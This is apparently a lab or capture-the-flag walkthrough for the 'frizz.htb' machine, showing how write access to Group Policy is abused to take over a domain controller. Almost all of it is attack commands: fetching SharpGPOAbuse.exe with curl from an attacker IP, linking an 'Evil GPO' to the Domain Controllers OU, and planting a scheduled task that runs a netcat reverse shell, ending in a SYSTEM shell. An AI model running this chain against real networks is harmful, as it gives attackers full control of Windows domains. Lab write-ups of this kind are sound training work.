
An Policy which allows us to read & write GPO on certain targets (e.G OU's). 

---

Transfered SharpGPOAbuse.exe onto the target system.

```
curl http://10.10.15.9/SharpGPOAbuse.exe -o SharpGPOAbuse.exe
```

1. It's best if you create another GPO to get an reverse shell.

```
New-GPO -name "Evil GPO"
```

2. Link GPO to Target GPO (e.G "Domain Controllers")

```
New-GPLink -Name "Evil GPO" -Target "OU=Domain Controllers,DC=frizz,DC=htb"
```

3. Start up listener on local machine:

```
rlwrap nc -lvnp 443
```

4. Abuse SharpHoundGPO.exe to execute command as the target system!

```
C:\Users\M.SchoolBus\Desktop\SharpGPOAbuse.exe --AddComputerTask --GPOName "Evil GPO" --Author "Evil GPO" --TaskName "EvilTask" --Command "cmd.exe" --Arguments "/c C:\Temp\nc.exe 10.10.15.9 443 -e cmd.exe" --Force
```

5. The next command will propagate the GPO:

**WARNING**: If it's not working, it's IMPORTANT that SharpGPOAbuse is stored in the directory of the user which has write permissions to GPO's!

```
gpupdate /force
```

Gained RCE as SYSTEM User.

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.15.9] from (UNKNOWN) [10.129.232.168] 61462
Microsoft Windows [Version 10.0.20348.3207]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

